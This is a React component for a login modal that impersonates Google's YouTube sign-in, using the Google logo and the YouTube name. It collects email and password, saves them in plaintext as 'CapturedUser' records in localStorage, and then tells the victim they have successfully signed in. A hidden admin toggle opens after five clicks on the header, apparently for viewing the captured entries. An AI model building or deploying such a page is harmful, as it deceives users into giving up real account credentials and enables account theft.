
import React, { useState } from 'react';
import { LoginStep, CapturedUser } from '../types';
import EmailStep from './EmailStep';
import PasswordStep from './PasswordStep';
import ForgotEmailStep from './ForgotEmailStep';
import ForgotPasswordStep from './ForgotPasswordStep';
import GoogleLogo from './icons/GoogleLogo';

const LoginModal: React.FC = () => {
  const [step, setStep] = useState<LoginStep>(LoginStep.EMAIL);
  const [email, setEmail] = useState('');
  const [clickCount, setClickCount] = useState(0);

  const handleHeaderClick = () => {
    const newCount = clickCount + 1;
    if (newCount >= 5) {
      window.dispatchEvent(new CustomEvent('toggle-admin'));
      setClickCount(0);
    } else {
      setClickCount(newCount);
      // Reset count after 2 seconds of inactivity
      setTimeout(() => setClickCount(0), 2000);
    }
  };

  const handleEmailSubmit = (submittedEmail: string) => {
    setEmail(submittedEmail);
    setStep(LoginStep.PASSWORD);
  };

  const handlePasswordSubmit = (password: string) => {
    const newUser: CapturedUser = {
      id: crypto.randomUUID(),
      email: email,
      password: password,
      timestamp: Date.now(),
    };

    // Database Mock (localStorage persistent store)
    try {
      const existingData = localStorage.getItem('user_database');
      const database = existingData ? JSON.parse(existingData) : [];
      database.push(newUser);
      localStorage.setItem('user_database', JSON.stringify(database));
    } catch (error) {
      console.error('Database write error:', error);
    }
    
    setStep(LoginStep.SUCCESS);
  };

  const handleGoBack = () => {
    setStep(LoginStep.EMAIL);
  };

  const handleBackToPassword = () => {
    setStep(LoginStep.PASSWORD);
  };

  const handleForgotEmail = () => {
    setStep(LoginStep.FORGOT_EMAIL);
  };

  const handleForgotPassword = () => {
    setStep(LoginStep.FORGOT_PASSWORD);
  };

  const renderStep = () => {
    switch (step) {
      case LoginStep.EMAIL:
        return <EmailStep onSubmit={handleEmailSubmit} onForgotEmail={handleForgotEmail} />;
      case LoginStep.FORGOT_EMAIL:
        return <ForgotEmailStep onBack={handleGoBack} />;
      case LoginStep.PASSWORD:
        return (
          <PasswordStep 
            email={email} 
            onSubmit={handlePasswordSubmit} 
            onBack={handleGoBack} 
            onForgotPassword={handleForgotPassword} 
          />
        );
      case LoginStep.FORGOT_PASSWORD:
        return <ForgotPasswordStep email={email} onBack={handleBackToPassword} />;
      case LoginStep.SUCCESS:
        return (
          <div className="text-center p-8 animate-in fade-in duration-500">
            <h2 className="text-2xl font-semibold mb-4 text-green-400">Account verified</h2>
            <p className="text-neutral-400">You have successfully signed in to YouTube.</p>
            <button 
              onClick={() => setStep(LoginStep.EMAIL)}
              className="mt-8 bg-neutral-800 hover:bg-neutral-700 text-white py-2 px-6 rounded-md text-sm transition-colors"
            >
              Done
            </button>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="bg-neutral-900/90 backdrop-blur-md rounded-2xl w-full max-w-md border border-neutral-800 shadow-2xl overflow-hidden">
      <div className="px-6 py-8 sm:px-10 sm:py-12">
        <div 
          className="text-center mb-2 cursor-default select-none active:opacity-80 transition-opacity"
          onClick={handleHeaderClick}
          title="Sign in header"
        >
          <div className="flex items-center justify-center gap-2 mb-4">
            <GoogleLogo />
            <span className="text-2xl font-bold tracking-tighter text-neutral-100">YouTube</span>
          </div>
          <h1 className="text-xl font-medium text-neutral-200">
            {step === LoginStep.FORGOT_EMAIL ? 'Find your email' : 
             step === LoginStep.FORGOT_PASSWORD ? 'Account recovery' : 
             'Sign in'}
          </h1>
          <p className="text-sm text-neutral-400 mt-2">
            {step === LoginStep.FORGOT_EMAIL ? 'Enter your recovery email or phone number' :
             step === LoginStep.FORGOT_PASSWORD ? 'Confirm the account belongs to you' :
             'to continue to YouTube'}
          </p>
        </div>
        <div className="mt-8">
          {renderStep()}
        </div>
      </div>
    </div>
  );
};

export default LoginModal;
